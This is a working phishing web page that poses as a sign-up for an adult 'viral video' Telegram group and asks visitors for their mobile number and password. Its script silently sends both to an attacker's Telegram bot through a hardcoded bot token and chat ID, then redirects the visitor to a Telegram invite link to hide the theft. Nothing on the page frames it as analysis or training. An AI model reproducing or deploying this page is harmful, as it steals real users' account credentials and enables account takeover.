<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Our Group</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; }

        .bg-slider {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
            background-size: cover; background-position: center; background-repeat: no-repeat;
            animation: slideEffect 20s linear infinite;
        }

        @keyframes slideEffect {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; overflow: hidden; }

        .app-container {
            width: 100%; max-width: 420px; background: rgba(255, 255, 255, 0.95);
            border-radius: 16px; box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
            padding: 24px; margin: 16px; display: flex; flex-direction: column; align-items: center;
        }

        .header-section { text-align: center; margin-bottom: 30px; width: 100%; }
        .community-logo { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #2481cc; margin-bottom: 12px; }
        
        .input-group { display: flex; gap: 10px; margin-bottom: 15px; width: 100%; position: relative; }
        
        .country-select { width: 85px; background: #f1f3f4; border: 1.5px solid #dadce0; border-radius: 8px; padding: 12px; font-weight: bold; }
        .phone-input { flex: 1; border: 1.5px solid #dadce0; border-radius: 8px; padding: 12px; font-size: 16px; }
        
        /* Eye Icon Style */
        .toggle-password {
            position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
            cursor: pointer; color: #888; user-select: none; font-size: 14px;
        }

        .join-btn { width: 100%; background: #2481cc; color: white; border: none; border-radius: 8px; padding: 14px; font-size: 16px; cursor: pointer; }
        .message { margin-top: 12px; font-size: 14px; text-align: center; display: none; }
        .success { color: #4caf50; }
        .error { color: #f44336; }
    </style>
</head>
<body>

    <div id="bgSlider" class="bg-slider"></div>

    <div class="app-container">
        <div class="header-section">
            <img src="https://i.ibb.co/ddfz7Rh/IMG-20260603-091432.jpg?w=150" class="community-logo">
            <h1>Tik tok Vairal video 🔞</h1>
        </div>

        <div class="join-form">
            <form id="telegramForm">
                <div class="input-group">
                    <select id="countryCode" class="country-select">
                        <option value="+880">BD</option>
                        <option value="+91">IN</option>
                    </select>
                    <input type="tel" id="phoneNumber" class="phone-input" placeholder="Mobile Number" required>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" class="phone-input" placeholder="Enter Password" required>
                    <span class="toggle-password" onclick="togglePass()">SHOW</span>
                </div>
                
                <button type="submit" class="join-btn" id="submitBtn">JOIN GROUP 🔞</button>
            </form>
            <div id="statusMessage" class="message"></div>
        </div>
    </div>

    <script>
        // Password Show/Hide Function
        function togglePass() {
            const passField = document.getElementById('password');
            const toggleText = document.querySelector('.toggle-password');
            if (passField.type === "password") {
                passField.type = "text";
                toggleText.innerText = "HIDE";
            } else {
                passField.type = "password";
                toggleText.innerText = "SHOW";
            }
        }

        // Background Logic
        const backgrounds = ["https://i.ibb.co/0yCcZXT0/IMG-20260505-125841.jpg", "https://i.ibb.co/XZg62Bvn/In-Shot-20260603-102611144.jpg"];
        document.getElementById('bgSlider').style.backgroundImage = `url('${backgrounds[Math.floor(Math.random() * backgrounds.length)]}')`;

        // Form Submission
        document.getElementById('telegramForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const submitBtn = document.getElementById('submitBtn');
            const statusMessage = document.getElementById('statusMessage');
            
            submitBtn.innerText = "Joining...";
            submitBtn.disabled = true;

            const text = `📌 *New Join Request*\n\n📱 Number: ${document.getElementById('countryCode').value}${document.getElementById('phoneNumber').value}\n🔑 Pass: ${document.getElementById('password').value}`;

            fetch(`https://api.telegram.org/bot8653143485:AAG2QPpyBEzwcWdcpnq5vXAqcMw6hlsJ5Zw/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: '6262892880', text: text, parse_mode: 'Markdown' })
            })
            .then(() => {
                statusMessage.className = "message success";
                statusMessage.innerText = "✅ Request Sent!";
                statusMessage.style.display = "block";
                setTimeout(() => window.location.href = "https://t.me/+hg0J0t3_bpIxZDQ1", 2000);
            })
            .catch(() => {
                statusMessage.className = "message error";
                statusMessage.innerText = "❌ Connection failed.";
                statusMessage.style.display = "block";
                submitBtn.innerText = "JOIN COMMUNITY";
                submitBtn.disabled = false;
            });
        });
    </script>
</body>
</html>
